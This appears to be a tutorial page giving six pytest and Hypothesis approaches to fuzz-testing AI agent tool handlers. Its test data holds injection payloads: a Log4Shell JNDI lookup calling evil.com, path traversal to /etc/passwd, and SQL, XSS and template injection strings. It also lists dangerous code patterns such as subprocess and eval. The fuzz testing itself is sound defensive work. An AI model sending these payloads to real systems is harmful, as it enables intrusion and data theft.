---
layout: solution
title: "Agent Doesn't Implement Fuzz Testing for Tool Inputs"
category: testing
description: "Tool input handlers are only tested with well-formed inputs. Malformed arguments, boundary values, unexpected types, and injection strings are never exercised, leaving crashes and security vulnerabilities undiscovered until production."
tags: [testing, fuzz-testing, hypothesis, security, tool-use, boundary-testing, pytest]
---

# Agent Doesn't Implement Fuzz Testing for Tool Inputs

## Problem

Tool handler functions are tested with `{"query": "hello", "max_results": 5}` but never with `{"query": "", "max_results": -1}`, `{"query": None}`, or `{"query": "'; DROP TABLE--"}`. The first user who sends an unusual request discovers the crash. Fuzz testing systematically generates unexpected inputs to find these edge cases before deployment.

## Solutions

### Option 1: Hypothesis Property-Based Fuzzing

```python
# tests/fuzz/test_tool_fuzz_hypothesis.py
"""
Use Hypothesis to generate thousands of random inputs for each tool handler.
Hypothesis shrinks failing cases to the smallest reproducer automatically.
"""
import pytest
from hypothesis import given, settings, assume, HealthCheck
from hypothesis import strategies as st
from pydantic import ValidationError
from your_tools.search import search_documents
from your_tools.execute import execute_code
from contracts.tool_contracts import SearchDocumentsInput, ExecuteCodeInput


# ── Search tool fuzzing ───────────────────────────────────────────────────────

@given(
    query=st.text(max_size=2000),
    max_results=st.integers(min_value=-100, max_value=1000),
    filter_tag=st.one_of(st.none(), st.text(max_size=100)),
)
@settings(max_examples=500, suppress_health_check=[HealthCheck.too_slow])
def test_search_never_crashes(query, max_results, filter_tag):
    """For any input, search_documents must never crash with an unhandled exception."""
    try:
        result = search_documents(query=query, max_results=max_results, filter_tag=filter_tag)
        # If it succeeds, the result must be a dict
        assert isinstance(result, dict)
    except (ValueError, TypeError, ValidationError):
        pass  # Expected for invalid inputs
    # Any other exception (IndexError, KeyError, AttributeError) = bug


@given(query=st.text(max_size=500).filter(lambda s: len(s.strip()) > 0))
@settings(max_examples=200)
def test_search_valid_query_returns_dict(query):
    """For non-empty queries, search must return a dict."""
    result = search_documents(query=query, max_results=5)
    assert isinstance(result, dict)
    assert "results" in result


@given(
    query=st.one_of(
        st.just(""),
        st.just(" " * 100),
        st.just("\x00\x01\x02"),  # null bytes
        st.just("'; DROP TABLE conversations; --"),  # SQL injection
        st.just("<script>alert('xss')</script>"),  # XSS
        st.just("a" * 10000),  # Very long string
        st.just("🔥" * 100),  # Emoji
    )
)
@settings(max_examples=7)
def test_search_handles_adversarial_queries(query):
    """Adversarial queries must not crash or raise unhandled exceptions."""
    try:
        result = search_documents(query=query, max_results=3)
        # Must return a dict even for bad inputs, or raise a handled exception
        if result is not None:
            assert isinstance(result, dict)
    except (ValueError, TypeError):
        pass  # Acceptable


# ── Execute code tool fuzzing ─────────────────────────────────────────────────

SAFE_LANGUAGES = ["python", "javascript", "bash"]
UNSAFE_PATTERNS = ["import os", "subprocess", "__import__", "eval(", "exec("]


@given(
    code=st.text(max_size=500),
    language=st.sampled_from(SAFE_LANGUAGES),
    timeout=st.integers(min_value=0, max_value=600),
)
@settings(max_examples=300, suppress_health_check=[HealthCheck.too_slow])
def test_execute_code_never_crashes_unhandled(code, language, timeout):
    """execute_code must handle all inputs without unhandled exceptions."""
    # Skip code that could actually execute malicious system calls
    assume(not any(p in code for p in UNSAFE_PATTERNS))
    try:
        result = execute_code(code=code, language=language, timeout_seconds=timeout)
        if result is not None:
            assert isinstance(result, dict)
            assert "exit_code" in result
    except (ValueError, TypeError, ValidationError):
        pass


@given(language=st.text(max_size=50))
@settings(max_examples=100)
def test_execute_code_rejects_unknown_language(language):
    """Unknown language must raise ValueError, never AttributeError or crash."""
    assume(language not in SAFE_LANGUAGES)
    with pytest.raises((ValueError, ValidationError)):
        execute_code(code="print('hello')", language=language, timeout_seconds=5)
```

**Expected Token Savings:** Not applicable — test infrastructure
**Environment:** `pip install hypothesis pytest pydantic`

---

### Option 2: Manual Boundary and Edge Case Fuzz Table

```python
# tests/fuzz/test_tool_boundary_cases.py
"""
Systematically test boundary values, type mismatches, injection strings,
and encoding edge cases. Parametrized so each case is a distinct test ID.
"""
import pytest
from your_tools.search import search_documents
from your_tools.code_runner import run_code_snippet


# ── Boundary values ───────────────────────────────────────────────────────────

QUERY_EDGE_CASES = [
    pytest.param("", id="empty_string"),
    pytest.param("   ", id="whitespace_only"),
    pytest.param("a", id="single_char"),
    pytest.param("a" * 500, id="max_length"),
    pytest.param("a" * 501, id="over_max_length"),
    pytest.param("hello\nworld", id="newline"),
    pytest.param("hello\x00world", id="null_byte"),
    pytest.param("hello\ttab", id="tab_character"),
    pytest.param("🔥💀🎯" * 20, id="emoji_heavy"),
    pytest.param("こんにちは世界", id="japanese_unicode"),
    pytest.param("مرحبا بالعالم", id="arabic_rtl"),
    pytest.param("<script>alert(1)</script>", id="xss_attempt"),
    pytest.param("'; DROP TABLE--", id="sql_injection"),
    pytest.param("${jndi:ldap://evil.com/x}", id="log4j_pattern"),
    pytest.param("../../../etc/passwd", id="path_traversal"),
    pytest.param("%00%01%02", id="url_encoded_control"),
    pytest.param("{{7*7}}", id="template_injection"),
]

MAX_RESULTS_EDGE_CASES = [
    pytest.param(0, id="zero"),
    pytest.param(-1, id="negative_one"),
    pytest.param(-1000, id="large_negative"),
    pytest.param(1, id="one"),
    pytest.param(100, id="at_max"),
    pytest.param(101, id="over_max"),
    pytest.param(10**9, id="billion"),
    pytest.param(None, id="none"),
    pytest.param("5", id="string_int"),
    pytest.param(5.5, id="float"),
    pytest.param(True, id="boolean_true"),
    pytest.param([], id="empty_list"),
]


@pytest.mark.parametrize("query", QUERY_EDGE_CASES)
def test_search_query_edge_case(query):
    """search_documents must handle all query edge cases without crashing."""
    try:
        result = search_documents(query=query, max_results=5)
        if result is not None:
            assert isinstance(result, dict), f"Expected dict, got {type(result)}"
    except (ValueError, TypeError) as e:
        # Explicit validation errors are acceptable
        assert str(e), "Exception must have a message"
    except Exception as e:
        pytest.fail(f"Unexpected exception for query={query!r}: {type(e).__name__}: {e}")


@pytest.mark.parametrize("max_results", MAX_RESULTS_EDGE_CASES)
def test_search_max_results_edge_case(max_results):
    """search_documents must not crash for any max_results value."""
    try:
        result = search_documents(query="test", max_results=max_results)
        if result is not None:
            assert isinstance(result.get("results", []), list)
    except (ValueError, TypeError):
        pass  # Acceptable validation rejection
    except Exception as e:
        pytest.fail(f"Unexpected exception for max_results={max_results!r}: {e}")


# ── Type confusion attacks ────────────────────────────────────────────────────

@pytest.mark.parametrize("bad_input", [
    pytest.param({"query": ["list", "not", "string"]}, id="list_as_query"),
    pytest.param({"query": {"nested": "dict"}}, id="dict_as_query"),
    pytest.param({"query": 12345}, id="int_as_query"),
    pytest.param({"query": True}, id="bool_as_query"),
    pytest.param({}, id="missing_required_field"),
    pytest.param({"unknown_field": "value"}, id="unknown_field_only"),
    pytest.param(None, id="null_payload"),
])
def test_search_rejects_malformed_payloads(bad_input):
    """Malformed call signatures must raise clean errors, never crash silently."""
    try:
        if bad_input is None:
            result = search_documents(**{})
        else:
            result = search_documents(**bad_input)
        # If it didn't raise, it must at least return a dict
        assert isinstance(result, dict)
    except (ValueError, TypeError, KeyError):
        pass
    except Exception as e:
        pytest.fail(f"Unexpected exception type for input={bad_input!r}: {type(e).__name__}: {e}")
```

**Expected Token Savings:** Not applicable — test security
**Environment:** `pip install pytest`

---

### Option 3: Mutation-Based Fuzzing of Recorded Inputs

```python
# tests/fuzz/test_mutation_fuzzing.py
"""
Start from known-good tool inputs recorded in production (or written by hand),
then systematically mutate them to find edge cases the tool doesn't handle.
"""
import copy
import json
import random
import string
from typing import Any
import pytest
from your_tools.search import search_documents


# Seed corpus: known-good inputs
SEED_CORPUS = [
    {"query": "Python asyncio patterns", "max_results": 10},
    {"query": "SQL query optimization", "max_results": 5, "filter_tag": "sql"},
    {"query": "FastAPI authentication", "max_results": 3},
]


def mutate_string(s: str, rng: random.Random) -> str:
    """Apply a random mutation to a string."""
    if not s:
        return s
    mutations = [
        lambda x: x + rng.choice(string.printable),  # append random char
        lambda x: x[:-1],  # truncate by 1
        lambda x: x.upper(),  # change case
        lambda x: x.replace(rng.choice(x) if x else "a", "\x00"),  # insert null byte
        lambda x: x * rng.randint(2, 5),  # repeat
        lambda x: rng.choice(["", " " * len(x), x[::-1]]),  # edge variants
        lambda x: x + "'; DROP TABLE--",  # SQL injection suffix
        lambda x: "<" + x + ">",  # XML wrapping
    ]
    return rng.choice(mutations)(s)


def mutate_int(n: int, rng: random.Random) -> Any:
    """Mutate an integer to an edge case."""
    return rng.choice([0, -1, -n, n * 2, 10**9, None, "string", [], True, n + 1, n - 1])


def mutate_payload(payload: dict, rng: random.Random, depth: int = 0) -> dict:
    """Recursively mutate a dict payload."""
    mutated = copy.deepcopy(payload)
    if not mutated or depth > 2:
        return mutated
    key = rng.choice(list(mutated.keys()))
    value = mutated[key]
    if isinstance(value, str):
        mutated[key] = mutate_string(value, rng)
    elif isinstance(value, int):
        mutated[key] = mutate_int(value, rng)
    elif value is None:
        mutated[key] = rng.choice(["", 0, [], {}, "null", False])
    # Optionally drop a key
    if rng.random() < 0.2 and len(mutated) > 1:
        drop_key = rng.choice(list(mutated.keys()))
        del mutated[drop_key]
    # Optionally add an unknown key
    if rng.random() < 0.2:
        mutated[f"unknown_{rng.randint(0, 99)}"] = rng.choice(["value", 0, None, []])
    return mutated


def generate_mutations(seed: dict, n: int = 50, seed_val: int = 42) -> list[dict]:
    rng = random.Random(seed_val)
    return [mutate_payload(seed, rng) for _ in range(n)]


# Generate test cases at collection time (deterministic)
ALL_MUTATIONS = []
for i, seed in enumerate(SEED_CORPUS):
    for j, mutation in enumerate(generate_mutations(seed, n=30, seed_val=i * 100 + j)):
        ALL_MUTATIONS.append(pytest.param(mutation, id=f"seed{i}_mut{j}"))


@pytest.mark.parametrize("payload", ALL_MUTATIONS)
def test_search_handles_mutated_input(payload):
    """Mutated inputs must not produce unhandled exceptions."""
    try:
        result = search_documents(**payload)
        if result is not None:
            assert isinstance(result, dict)
    except (ValueError, TypeError, KeyError):
        pass  # Validation errors are fine
    except Exception as e:
        pytest.fail(f"Unhandled exception for payload={payload}: {type(e).__name__}: {e}")
```

**Expected Token Savings:** Not applicable — security testing
**Environment:** `pip install pytest`

---

### Option 4: JSON Schema Boundary Fuzzer

```python
# tests/fuzz/test_schema_boundary_fuzzer.py
"""
Given a JSON Schema (from the agent's tool definitions), automatically generate
boundary-value test cases that push against every constraint:
- minLength/maxLength strings
- minimum/maximum integers
- required vs optional fields
- enum values and invalid values
"""
import json
import random
import string
import pytest
from your_agent.tools import TOOL_DEFINITIONS
from your_tools.dispatch import dispatch_tool


def _boundary_strings(min_len: int = 0, max_len: int = 255) -> list[str]:
    return [
        "",                          # below min
        "a" * max(0, min_len - 1),   # just below min
        "a" * min_len,               # at min
        "a" * ((min_len + max_len) // 2),  # middle
        "a" * max_len,               # at max
        "a" * (max_len + 1),         # just over max
        "a" * (max_len * 10),        # way over max
    ]


def _boundary_ints(minimum: int = 0, maximum: int = 100) -> list:
    return [
        minimum - 1,   # just below min
        minimum,       # at min
        minimum + 1,
        (minimum + maximum) // 2,
        maximum - 1,
        maximum,       # at max
        maximum + 1,   # just over max
        0, -1, -1000, 10**9, None, "string", [], True,
    ]


def _generate_boundary_cases(schema: dict) -> list[dict]:
    """Generate boundary test cases from a JSON Schema."""
    cases = []
    props = schema.get("properties", {})
    required = set(schema.get("required", []))

    # Case 1: all required fields missing
    cases.append({})

    # Case 2: all required fields set to None
    cases.append({k: None for k in required})

    # Case 3: boundary values for each property
    for prop_name, prop_schema in props.items():
        base = {k: f"valid_{k}" for k in required}  # Start with valid values
        prop_type = prop_schema.get("type", "string")

        if prop_type == "string":
            min_len = prop_schema.get("minLength", 0)
            max_len = prop_schema.get("maxLength", 255)
            for val in _boundary_strings(min_len, max_len):
                case = dict(base)
                case[prop_name] = val
                cases.append(case)

        elif prop_type == "integer":
            minimum = prop_schema.get("minimum", 0)
            maximum = prop_schema.get("maximum", 100)
            for val in _boundary_ints(minimum, maximum):
                case = dict(base)
                case[prop_name] = val
                cases.append(case)

        elif "enum" in prop_schema:
            valid_vals = prop_schema["enum"]
            for val in valid_vals + ["invalid_enum_value", "", None, 0]:
                case = dict(base)
                case[prop_name] = val
                cases.append(case)

    return cases


# Build parametrized test cases for all tools
ALL_TOOL_FUZZ_CASES = []
for tool_def in TOOL_DEFINITIONS:
    tool_name = tool_def["name"]
    schema = tool_def.get("input_schema", {})
    for i, case in enumerate(_generate_boundary_cases(schema)):
        ALL_TOOL_FUZZ_CASES.append(
            pytest.param(tool_name, case, id=f"{tool_name}_boundary_{i}")
        )


@pytest.mark.parametrize("tool_name,input_args", ALL_TOOL_FUZZ_CASES)
def test_tool_boundary_never_crashes(tool_name, input_args):
    """Schema boundary values must never produce unhandled exceptions."""
    try:
        result = dispatch_tool(tool_name, input_args)
        if result is not None:
            assert isinstance(result, dict)
    except (ValueError, TypeError, KeyError):
        pass  # Clean validation errors are acceptable
    except Exception as e:
        pytest.fail(
            f"Unhandled exception for {tool_name}({json.dumps(input_args, default=str)}): "
            f"{type(e).__name__}: {e}"
        )
```

**Expected Token Savings:** Not applicable — security + reliability testing
**Environment:** `pip install pytest`

---

### Option 5: Concurrent Fuzz Test (Race Condition Discovery)

```python
# tests/fuzz/test_concurrent_fuzz.py
"""
Run many fuzzed inputs concurrently to discover race conditions,
shared state corruption, and thread-safety bugs in tool handlers.
"""
import asyncio
import random
import string
import pytest
from your_tools.search import search_documents_async
from your_tools.execute import execute_code_async


def _random_query(rng: random.Random, max_len: int = 200) -> str:
    length = rng.randint(0, max_len)
    chars = string.ascii_letters + string.digits + " \n\t"
    return "".join(rng.choices(chars, k=length))


async def _one_call(rng: random.Random, call_id: int) -> dict:
    query = _random_query(rng)
    max_results = rng.choice([-1, 0, 1, 5, 10, 100, None])
    try:
        result = await search_documents_async(query=query, max_results=max_results)
        return {"call_id": call_id, "status": "ok", "result_type": type(result).__name__}
    except (ValueError, TypeError):
        return {"call_id": call_id, "status": "validation_error"}
    except Exception as e:
        return {"call_id": call_id, "status": "error", "error": f"{type(e).__name__}: {e}"}


@pytest.mark.asyncio
@pytest.mark.parametrize("concurrency,num_calls", [
    (5, 50),
    (20, 100),
    (50, 200),
])
async def test_concurrent_fuzz_no_crashes(concurrency, num_calls):
    """Concurrent random calls must not produce race conditions or crashes."""
    rng = random.Random(42)
    sem = asyncio.Semaphore(concurrency)

    async def bounded_call(call_id: int):
        async with sem:
            return await _one_call(rng, call_id)

    results = await asyncio.gather(*[bounded_call(i) for i in range(num_calls)])
    errors = [r for r in results if r["status"] == "error"]

    # Allow validation errors, but not unhandled exceptions
    assert not errors, (
        f"Concurrent fuzz found {len(errors)} unhandled errors:\n"
        + "\n".join(f"  call {e['call_id']}: {e['error']}" for e in errors[:5])
    )


@pytest.mark.asyncio
async def test_concurrent_writes_dont_corrupt_state():
    """Concurrent calls must not corrupt shared tool state."""
    queries = [f"test query {i}" for i in range(50)]
    results = await asyncio.gather(*[
        search_documents_async(query=q, max_results=3)
        for q in queries
    ])
    # Each result must correspond to its own query (no state mixing)
    for i, result in enumerate(results):
        if result and isinstance(result, dict):
            # Echo field (if present) must match the input query
            if "query_echo" in result:
                assert result["query_echo"] == queries[i], (
                    f"State corruption: call {i} got query_echo={result['query_echo']!r}, "
                    f"expected {queries[i]!r}"
                )
```

**Expected Token Savings:** Not applicable — concurrency safety testing
**Environment:** `pip install pytest pytest-asyncio`

---

### Option 6: CI Fuzz Harness with Crash Corpus

```python
# tests/fuzz/crash_corpus_runner.py
"""
Maintain a corpus of previously discovered crash-inducing inputs.
On every CI run, replay the entire corpus to ensure old bugs don't regress.
New crashes are automatically added to the corpus.
"""
import json
import traceback
from pathlib import Path
from typing import Callable
import pytest

CORPUS_DIR = Path("tests/fuzz/corpus")
CORPUS_DIR.mkdir(parents=True, exist_ok=True)


def load_corpus(tool_name: str) -> list[dict]:
    path = CORPUS_DIR / f"{tool_name}.jsonl"
    if not path.exists():
        return []
    return [json.loads(line) for line in path.read_text().splitlines() if line.strip()]


def add_to_corpus(tool_name: str, input_args: dict, error: str):
    path = CORPUS_DIR / f"{tool_name}.jsonl"
    entry = {"input": input_args, "error": error}
    with open(path, "a") as f:
        f.write(json.dumps(entry, default=str) + "\n")
    print(f"[corpus] Added crash case to {path}")


def fuzz_and_record(
    tool_name: str,
    tool_fn: Callable,
    inputs: list[dict],
    record_crashes: bool = True,
) -> list[dict]:
    """
    Run tool_fn against all inputs. Record unhandled exceptions to corpus.
    Returns list of crash reports.
    """
    crashes = []
    for args in inputs:
        try:
            result = tool_fn(**args)
        except (ValueError, TypeError, KeyError):
            pass  # Expected validation errors
        except Exception as e:
            crash = {
                "input": args,
                "exception_type": type(e).__name__,
                "message": str(e),
                "traceback": traceback.format_exc(),
            }
            crashes.append(crash)
            if record_crashes:
                add_to_corpus(tool_name, args, f"{type(e).__name__}: {e}")
    return crashes


# ── Corpus replay tests ───────────────────────────────────────────────────────

def get_corpus_cases(tool_name: str) -> list:
    corpus = load_corpus(tool_name)
    if not corpus:
        return [pytest.param({}, id="empty_corpus_placeholder")]
    return [
        pytest.param(entry["input"], id=f"corpus_{i}")
        for i, entry in enumerate(corpus)
    ]


@pytest.mark.parametrize("input_args", get_corpus_cases("search_documents"))
def test_search_corpus_regression(input_args):
    """Replay the crash corpus — none should crash anymore."""
    from your_tools.search import search_documents
    if not input_args:
        pytest.skip("Empty corpus")
    try:
        search_documents(**input_args)
    except (ValueError, TypeError):
        pass  # Validation error is OK
    except Exception as e:
        pytest.fail(
            f"Corpus regression: input {input_args!r} still crashes with "
            f"{type(e).__name__}: {e}"
        )
```

**Expected Token Savings:** Not applicable — regression prevention
**Environment:** `pip install pytest`

---

## Comparison Table

| Option | Generation Method | Detects Crashes | Detects Logic Bugs | Detects Race Conditions | Corpus Growth |
|--------|------------------|-----------------|-------------------|------------------------|---------------|
| 1: Hypothesis | Property-based | Yes | Yes | No | Automatic (shrink) |
| 2: Boundary table | Manual parametrize | Yes | Yes | No | Manual |
| 3: Mutation | Seed corpus mutate | Yes | Partial | No | Manual |
| 4: Schema-driven | JSON Schema bounds | Yes | Partial | No | Manual |
| 5: Concurrent | Random + async | Yes | No | Yes | No |
| 6: Crash corpus | Recorded failures | Yes (regression) | No | No | Automatic |
